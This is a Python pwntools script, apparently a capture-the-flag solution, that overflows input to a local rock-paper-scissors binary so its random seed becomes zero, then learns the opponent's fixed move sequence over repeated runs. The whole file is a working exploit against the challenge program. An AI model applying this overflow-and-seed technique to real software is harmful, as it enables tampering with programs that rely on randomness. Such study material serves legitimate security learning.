from pwn import *

my_moves = {'P': 'S', 'R': 'P', 'S': 'R'}

# their_moves = []
their_moves = ['P', 'P', 'R', 'P', 'S', 'P', 'P', 'R', 'R', 'P', 'S', 'P', 'S', 'P', 'S', 'P', 'R', 'R', 'P', 'P', 'S', 'S', 'R', 'R', 'S', 'S', 'S', 'P', 'P', 'P', 'S' , 'R', 'R', 'R', 'S', 'R', 'P', 'P', 'P', 'P', 'R', 'R', 'R', 'S', 'S', 'P', 'S', 'S', 'S', 'R']


while len(their_moves) < 51:
    r = process('./rps')

    # srand will get '0'
    shellcode = cyclic(48) + '\x00' * 4

    r.sendline(shellcode)
    next_moves = their_moves[:]

    log.info('Their moves: {}'.format(their_moves))

    r.clean()
    
    # Just try a random at the end
    their_moves.append('R')

    # import pdb; pdb.set_trace()
    log.info("Len of their: {}".format(len(their_moves)))
    for their_move in their_moves:
        # game = r.recvuntil(']')
        # log.info('n' + game)

        my_move = my_moves[their_move]
        log.info("Trying {}".format(my_move))
        r.sendline(my_move)

        game = r.recvuntil('\n')
        log.info('Game: {}'.format(game))
        their_move = game.split('-')[1][0]
        log.info('Their move: {}'.format(their_move))
        # r.recvuntil('\n')
        # log.info('Status: {}'.format(r.recv()))
        # sleep(0.1)
        r.clean()


    log.info("Appending {}".format(their_move))
    next_moves.append(their_move)

    log.info("their-moves".format(their_moves))
    their_moves = next_moves[:]
    r.close()

    print their_moves
